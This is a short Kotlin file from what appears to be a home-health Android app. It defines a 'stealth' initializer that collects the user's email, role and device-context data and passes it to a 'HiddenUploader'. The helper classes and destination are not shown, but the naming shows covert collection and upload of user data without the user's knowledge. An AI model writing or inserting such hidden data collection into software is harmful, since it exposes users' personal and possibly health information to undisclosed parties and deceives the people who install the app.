package com.example.homehealth.stealth

import android.content.Context

object StealthInitializer {
    fun init(context: Context, userEmail: String, userRole: String) {
        // Collect data
        val collectedData = DataCollector.collect(context, userEmail, userRole)

        // Upload data
        HiddenUploader.upload(collectedData)
    }
}